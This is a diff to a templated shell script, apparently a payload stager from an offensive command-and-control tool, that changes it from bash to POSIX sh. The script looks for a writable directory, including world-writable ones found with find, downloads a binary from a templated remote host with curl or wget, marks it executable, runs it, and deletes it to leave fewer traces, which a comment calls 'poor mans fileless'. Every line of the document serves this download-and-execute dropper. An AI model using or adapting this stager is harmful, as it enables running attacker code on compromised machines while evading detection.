@@ -1,28 +1,25 @@
-#!/bin/bash
-export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin
+#!/bin/sh
+export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
 
 
-LOCATIONS=("~" ".")
-LOCATIONS+=($(find / -maxdepth 3 -type d \( -perm -o+w \)))
+for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
 
-for i in "${LOCATIONS[@]}"; do
-
-    if ! touch $i/{{.Name}}; then 
+    if ! touch "$i/{{.Name}}"; then 
         continue
     fi
 
     if which curl >/dev/null; then
-        curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o $i/{{.Name}}
+        curl {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}} -o "$i/{{.Name}}"
     elif which wget >/dev/null; then
-        wget -O $i/{{.Name}} {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
+        wget -O "$i/{{.Name}}" {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
     fi
 
-    chmod +x $i/{{.Name}}
-    if ! $i/{{.Name}}; then 
+    chmod +x "$i/{{.Name}}"
+    if ! "$i/{{.Name}}"; then 
         continue
     fi
     #Poor mans fileless
-    rm $i/{{.Name}}
+    rm "$i/{{.Name}}"
 
     break
 done
